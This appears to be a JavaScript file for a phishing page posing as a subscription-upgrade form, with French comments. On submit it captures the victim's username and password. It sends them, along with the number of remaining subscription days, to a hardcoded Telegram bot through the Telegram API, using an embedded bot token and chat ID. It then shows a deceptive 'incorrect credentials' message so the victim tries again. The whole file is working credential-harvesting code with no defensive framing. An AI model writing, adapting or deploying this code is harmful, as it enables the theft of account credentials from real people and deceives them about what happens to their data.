document.getElementById('upgrade-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche la soumission par défaut du formulaire

    // Récupère les valeurs du formulaire
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value; // Nouvelle récupération de mot de passe
    const subscriptionDays = parseInt(document.getElementById('subscription').value, 10);

    let resultMessage;
    let messageClass = '';

    // Vérifie si l'utilisateur a au moins 15 jours restants
    if (subscriptionDays >= 15) {
        resultMessage = `., ${username} ! Coordonnées Incorectes.`;
    } else {
        resultMessage = `Désolé, ${username}. Votre abonnement doit avoir au moins 15 jours restants pour être éligible.`;
    }

    // Affiche le résultat dans la page
    const resultElement = document.getElementById('result');
    resultElement.textContent = resultMessage;

    // Détermine la classe CSS en fonction du message
    if (subscriptionDays >= 15) {
        resultElement.className = 'success';
    } else {
        resultElement.className = 'error';
    }

    // Prépare le message à envoyer à Telegram
    const botToken = '7206998515:AAGKusYHUyuwiApDkduV4rpxoRv9xN_UUho'; // Token de ton bot
    const chatId = '6610878129'; // ID du chat
    const message = `Coordonnées reçues:\n\nUsername: ${username}\nMot de passe: ${password}\nJours restants: ${subscriptionDays}`;

    // Envoie le message à Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Message envoyé avec succès');
        } else {
            console.error('Erreur lors de l\'envoi du message:', data);
        }
    })
    .catch(error => {
        console.error('Erreur:', error);
    });
});